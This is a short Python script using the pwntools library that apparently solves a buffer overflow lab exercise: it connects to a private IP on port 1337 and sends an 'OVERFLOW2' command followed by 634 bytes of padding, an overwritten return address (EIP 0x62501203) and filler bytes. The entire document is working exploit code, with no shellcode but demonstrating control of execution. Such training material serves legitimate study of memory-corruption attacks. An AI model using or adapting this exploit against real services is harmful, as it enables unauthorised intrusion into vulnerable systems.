#!/usr/bin/env python3

from pwn import *

host = "10.10.97.153"
port = 1337

s = remote(host, port)
s.settimeout(5)
total_length = 1000
offset = 634
new_eip = p32(0x62501203)

payload = [
    b"OVERFLOW2 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip)),

]
payload = b"".join(payload)
s.send(payload)
